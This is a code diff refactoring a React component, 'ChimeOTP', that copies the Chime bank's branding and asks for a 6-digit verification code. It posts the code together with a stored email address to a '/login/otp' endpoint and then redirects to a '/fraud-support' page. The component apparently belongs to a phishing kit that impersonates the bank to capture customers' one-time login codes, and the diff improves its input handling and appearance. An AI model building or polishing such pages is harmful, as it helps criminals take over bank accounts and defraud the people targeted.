@@ -1,5 +1,5 @@
 import { useRef, useState } from "react";
-import { Box, Typography, TextField, Button, Link } from "@mui/material";
+import { Box, Typography, TextField, Button, Link, Paper } from "@mui/material";
 import { useNavigate } from "react-router-dom";
 import toast from "react-hot-toast";
 import { SpinnerLoading } from "./SpinnerLoading";
@@ -7,70 +7,86 @@ import api from "./axios";
 import { emailStore } from "./authStore";
 
 export default function ChimeOTP() {
+  const navigate = useNavigate();
+  const email = emailStore((state) => state.email);
+
   const [otp, setOtp] = useState(["", "", "", "", "", ""]);
+  const [isLoading, setIsLoading] = useState(false);
+
   const inputsRef = useRef([]);
 
   const handleChange = (value, index) => {
-    if (!/^[0-9]?$/.test(value)) return;
+    if (!/^\d?$/.test(value)) return;
 
-    const newOtp = [...otp];
-    newOtp[index] = value;
-    setOtp(newOtp);
+    const updated = [...otp];
+    updated[index] = value;
+    setOtp(updated);
 
-    // Move forward
     if (value && index < 5) {
-      inputsRef.current[index + 1].focus();
+      inputsRef.current[index + 1]?.focus();
     }
   };
 
   const handleKeyDown = (e, index) => {
-    // Move back on delete
-    if (e.key === "Backspace" && !otp[index] && index > 0) {
-      inputsRef.current[index - 1].focus();
+    if (e.key === "Backspace") {
+      if (otp[index]) {
+        const updated = [...otp];
+        updated[index] = "";
+        setOtp(updated);
+      } else if (index > 0) {
+        inputsRef.current[index - 1]?.focus();
+      }
     }
   };
 
   const handlePaste = (e) => {
-    const paste = e.clipboardData.getData("text").slice(0, 6);
-    if (!/^\d+$/.test(paste)) return;
+    e.preventDefault();
 
-    const newOtp = paste.split("");
-    setOtp([...newOtp, ...Array(6 - newOtp.length).fill("")]);
+    const pasted = e.clipboardData
+      .getData("text")
+      .replace(/\D/g, "")
+      .slice(0, 6);
 
-    newOtp.forEach((_, i) => {
-      if (inputsRef.current[i]) {
-        inputsRef.current[i].value = newOtp[i];
-      }
+    const updated = [...otp];
+
+    pasted.split("").forEach((digit, i) => {
+      updated[i] = digit;
     });
+
+    setOtp(updated);
+
+    const next = Math.min(pasted.length, 5);
+    inputsRef.current[next]?.focus();
   };
 
-  const [isLoading, setIsLoading] = useState(false);
+  const onSubmit = async () => {
+    const code = otp.join("");
 
-  
-  const navigate = useNavigate();
-   const email = emailStore((state) => state.email);
-    
-    const onSubmit = async () => {
-      if (otp.length < 6)
-        return toast.warning(
-          "OTP must not be less than 6 digits",
-        );
-      try {
-        setIsLoading(true);
-        const response = await api.post("/login/otp", {otp, email});
-        const { success, message } = response.data;
+    if (code.length !== 6) {
+      return toast.error("Please enter the 6-digit verification code.");
+    }
 
-        if (!success)
-          return toast.error(message || "Verification failed please try again.");
-        toast.success(message);
+    try {
+      setIsLoading(true);
 
-       return navigate("/fraud-support");
-      } catch (err) {
-        toast.error(err.response?.data?.message);
-      } finally {
-        setIsLoading(false);
+      const { data } = await api.post("/login/otp", {
+        otp: code,
+        email,
+      });
+
+      if (!data.success) {
+        return toast.error(data.message || "Verification failed.");
       }
-    };
+
+      toast.success(data.message);
+
+      navigate("/fraud-support");
+    } catch (err) {
+      toast.error(err.response?.data?.message || "Something went wrong.");
+    } finally {
+      setIsLoading(false);
+    }
+  };
 
   return (
     <Box
@@ -78,64 +94,81 @@ export default function ChimeOTP() {
         minHeight: "100vh",
         bgcolor: "#031f1a",
         display: "flex",
-        alignItems: "center",
         justifyContent: "center",
-        color: "white",
+        alignItems: "center",
+        px: 2,
       }}
     >
-      <Box sx={{ width: 380 }}>
-        {/* Logo */}
-        <Typography
-          variant="h3"
-          sx={{ color: "#2de28a", fontWeight: 700, mb: 3 }}
-        >
+      <Paper
+        elevation={0}
+        sx={{
+          width: "100%",
+          maxWidth: 420,
+          bgcolor: "transparent",
+          color: "#fff",
+        }}
+      >
+        <Typography variant="h3" fontWeight={700} color="#2de28a" mb={4}>
           chime
         </Typography>
 
-        {/* Title */}
-        <Typography sx={{ fontSize: "1.3rem", mb: 1 }}>
+        <Typography variant="h5" fontWeight={600}>
           Enter verification code
         </Typography>
 
-        <Typography sx={{ fontSize: "0.9rem", color: "#a0b3ad", mb: 3 }}>
-          We sent a 6-digit code to your phone
+        <Typography
+          sx={{
+            color: "#9db1ab",
+            mt: 1,
+            mb: 4,
+          }}
+        >
+          Enter the 6-digit code sent to your email.
         </Typography>
 
-        {/* OTP Inputs */}
         <Box
-          sx={{
-            display: "flex",
-            justifyContent: "space-between",
-            gap: 1,
-          }}
           onPaste={handlePaste}
+          sx={{
+            display: "grid",
+            gridTemplateColumns: "repeat(6,1fr)",
+            gap: 1.2,
+          }}
         >
           {otp.map((digit, index) => (
             <TextField
               key={index}
-              inputRef={(el) => (inputsRef.current[index] = el)}
               value={digit}
+              inputRef={(el) => (inputsRef.current[index] = el)}
               onChange={(e) => handleChange(e.target.value, index)}
               onKeyDown={(e) => handleKeyDown(e, index)}
+              autoComplete="one-time-code"
               inputProps={{
                 maxLength: 1,
+                inputMode: "numeric",
                 style: {
                   textAlign: "center",
-                  fontSize: "1.2rem",
+                  fontSize: "1.4rem",
+                  fontWeight: 600,
+                  padding: "14px 0",
                 },
               }}
               sx={{
-                width: 50,
                 "& .MuiOutlinedInput-root": {
-                  borderRadius: "12px",
                   bgcolor: "#062923",
-                  color: "white",
+                  borderRadius: 2,
+                  color: "#fff",
+
                   "& fieldset": {
-                    borderColor: "#3a5c54",
+                    borderColor: "#34514a",
                   },
+
+                  "&:hover fieldset": {
+                    borderColor: "#2de28a",
+                  },
+
                   "&.Mui-focused fieldset": {
                     borderColor: "#2de28a",
-                    boxShadow: "0 0 0 2px rgba(45, 226, 138, 0.2)",
+                    borderWidth: 2,
                   },
                 },
               }}
@@ -143,53 +176,53 @@ export default function ChimeOTP() {
           ))}
         </Box>
 
-        {/* Verify Button */}
         <Button
-          onClick={onSubmit}
           fullWidth
+          variant="contained"
+          onClick={onSubmit}
+          disabled={isLoading}
           sx={{
             mt: 4,
-            py: 1.5,
-            borderRadius: "12px",
+            py: 1.6,
+            borderRadius: 2,
             bgcolor: "#04ffc5",
-            color: "#9aa5a1",
+            color: "#031f1a",
+            fontWeight: 700,
             textTransform: "none",
-            fontWeight: 600,
             "&:hover": {
-              bgcolor: "#22443c",
+              bgcolor: "#00ddb0",
             },
           }}
         >
           Verify
         </Button>
 
-        {/* Resend */}
-        <Box sx={{ mt: 3 }}>
+        <Box textAlign="center" mt={3}>
           <Link
-            href="#"
-            underline="always"
+            component="button"
+            underline="hover"
             sx={{
-              color: "white",
-              fontSize: "0.9rem",
-              "&:hover": { color: "#2de28a" },
+              color: "#2de28a",
+              fontSize: ".9rem",
             }}
           >
-            Didn’t receive a code? Resend
+            Didn't receive the code? Resend
           </Link>
         </Box>
 
-        {/* Footer */}
         <Typography
+          align="center"
           sx={{
-            mt: 4,
-            fontSize: "0.75rem",
-            color: "#8aa39c",
+            mt: 5,
+            color: "#7f9992",
+            fontSize: ".8rem",
           }}
         >
-          © 2026 Chime. All Rights Reserved.
+          © 2026 Chime. All rights reserved.
         </Typography>
-      </Box>
-       {isLoading && <SpinnerLoading />}
+      </Paper>
+
+      {isLoading && <SpinnerLoading />}
     </Box>
   );
 }
